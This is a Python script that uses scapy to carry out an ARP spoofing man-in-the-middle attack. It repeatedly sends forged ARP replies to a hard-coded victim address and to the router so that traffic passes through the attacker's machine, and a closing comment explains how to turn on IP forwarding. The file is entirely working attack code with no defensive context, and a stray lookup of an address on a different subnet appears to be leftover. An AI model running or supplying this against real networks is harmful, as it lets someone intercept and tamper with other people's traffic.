#!/usr/bin/env python3

import scapy.all as scapy
import time


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


get_mac("10.0.2.1")

sent_packets_count = 0

while True:
    # victim IP, router IP
    spoof("192.168.0.126", "192.168.0.1")
    # router IP, victim IP
    spoof("192.168.0.1", "192.168.0.126")
    sent_packets_count += 2
    print("\r - Packets sent: " + str(sent_packets_count), end="")
    time.sleep(2)

# To enable IP forwarding on Linux:
# echo 1 > /proc/sys/net/ipv4/ip_forward
